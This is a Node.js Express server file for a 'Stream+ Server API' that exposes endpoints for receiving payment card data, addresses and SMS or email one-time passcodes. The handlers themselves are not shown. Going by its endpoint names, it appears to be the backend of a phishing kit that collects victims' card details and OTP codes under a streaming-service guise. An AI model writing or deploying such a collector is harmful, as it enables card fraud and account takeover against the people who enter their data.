const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const config = require('./config');

const sendPayment = require('./api/send-payment');
const sendAddress = require('./api/send-address');
const sendOtp = require('./api/send-otp');

const app = express();

app.use(helmet());
app.use(cors());
app.use(rateLimit({
    windowMs: 15 * 60 * 1000,
    max: 100,
    message: 'Too many requests from this IP, please try again later.'
}));
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

app.get('/', (req, res) => {
    res.json({
        success: true,
        message: 'Stream+ Server API is running',
        version: config.server.version,
        endpoints: {
            'POST /api/send-payment': 'Send payment / card data',
            'POST /api/send-address': 'Send address data',
            'POST /api/send-otp': 'Send SMS / email OTP'
        },
        timestamp: new Date().toISOString()
    });
});

app.get('/api/health', (req, res) => {
    res.json({
        success: true,
        message: 'Server is running',
        timestamp: new Date().toISOString()
    });
});

app.post('/api/send-payment', (req, res) => sendPayment(req, res));
app.post('/api/send-address', (req, res) => sendAddress(req, res));
app.post('/api/send-otp', (req, res) => sendOtp(req, res));

// Keep old SMS path as alias for OTP
app.post('/api/send-sms', (req, res) => sendOtp(req, res));

app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).json({ success: false, message: 'Something went wrong!' });
});

app.use((req, res) => {
    res.status(404).json({ success: false, message: 'Route not found' });
});

const PORT = config.server.port || process.env.PORT || 3000;
if (require.main === module) {
    app.listen(PORT, () => {
        console.log(`🚀 Stream+ Server running on port ${PORT}`);
        console.log(`🔗 POST /api/send-payment`);
        console.log(`🔗 POST /api/send-address`);
        console.log(`🔗 POST /api/send-otp`);
    });
}

module.exports = app;
